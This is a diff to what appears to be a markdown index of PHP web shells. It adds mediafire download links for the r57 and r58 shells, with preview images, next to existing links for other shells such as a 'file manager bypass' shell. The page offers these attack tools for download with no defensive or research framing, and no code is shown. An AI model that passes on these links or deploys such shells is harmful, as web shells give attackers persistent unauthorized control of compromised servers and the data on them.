@@ -97,6 +97,12 @@ Date : 10 January 2023
 # <a href="https://www.mediafire.com/file/uxwiquifhjf4tel/rebirthhaxorV1_shell.php/file">.: R E B I R T H :.</a>
 <img src="https://imgur.com/uo6Mgvl.png" alt="beruangsalju profile">
 
+ # <a href="https://www.mediafire.com/file/cjeapao91pq2vft/r57.php/file">.:r57:.</a>
+<img src="https://i.imgur.com/yYS89YW.png" alt="beruangsalju profile">
+  
+# <a href="https://www.mediafire.com/file/4dbcii2fi3luedy/r58.php/file">.:r58:.</a>
+<img src="https://i.imgur.com/D8cZUv9.png" alt="beruangsalju profile">
+  
 # <a href="https://www.mediafire.com/file/ma0fjtnvp7jpchd/sfm-bypass_shell.php/file">Simple File Manager Bypass</a>
 <img src="https://imgur.com/uiB4HT6.png" alt="beruangsalju profile">
 
